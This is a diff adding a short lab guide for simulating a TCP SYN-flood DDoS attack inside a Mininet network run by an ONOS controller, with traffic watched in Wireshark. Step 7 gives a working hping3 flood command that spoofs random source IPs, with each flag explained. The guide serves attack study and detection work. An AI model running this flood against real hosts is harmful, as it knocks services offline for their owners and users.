@@ -1,0 +1,42 @@
+#! DDoS attack: Network Attack Simulation
+Ensure that the mininet topology with the ONOS controller have been started.
+
+
+#1. Verify the network connectivity
+$ pingall
+
+#2. Download packages from all configured sources
+$ sudo apt-get update
+
+#3. Install hping3 tool
+$ sudo apt-get install hping3
+
+#4. Open the host terminal of the attacker
+$ xterm <hostname>
+
+#5. Check the ip address.
+$ ifconfig
+- verify the ip address is correct. 
+
+#6. Open terminal for the destination, open wireshark and monitor the current conditions
+$ xterm <hostname>
+$ wireshark
+
+#7. Run the hping3 attack command on the attacker host terminal
+$  sudo hping3 -c 10000 -d 20 -S -w 64 -p 80 --flood --rand-source <IP_ADDRESS_TARGET>
+
+- -c 10000 shows the number of packets being sent.
+- -d 20 display the packet data size of 20 bytes
+- -S is the SYN flag in the TCP header
+- -w 64 is the TCP window size
+- -p 80 is the target port 80 (normally used for HTTP)
+- --flood sends the packets as fast as possible
+- --rand-source uses the random source IP addresses
+- <IP_ADDRESS_TARGET> is the target IP address
+
+- this command sends 10000 packets with a load of 20 bytes to the target host at port 80.
+- It uses a SYN flood simulation with random source IP addresses
+
+#8. Monitor attack on Wireshark
+- Monitor the incoming traffic which shows the SYN Flood with the random source IP address
+- Increase in traffic is visible on Wireshark of the target host
